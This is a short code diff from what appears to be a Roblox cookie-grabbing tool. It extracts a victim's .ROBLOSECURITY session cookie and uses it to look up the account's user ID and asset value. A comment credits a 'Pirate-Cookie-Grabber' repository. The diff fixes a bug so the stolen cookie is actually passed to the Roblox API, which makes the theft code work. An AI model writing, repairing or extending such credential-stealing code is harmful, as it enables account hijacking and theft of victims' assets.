@@ -399,7 +399,7 @@ cookies = str(cookies)
 cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
 
 # the following part was skidded from https://github.com/Mani175/Pirate-Cookie-Grabber/ because idfk how to do it myself and i too am lazy to search on google
-ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
+ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
 info = json.loads(ebruh.text)
 rid = info["UserID"]
 rap = robloxpy.User.External.GetRAP(rid)
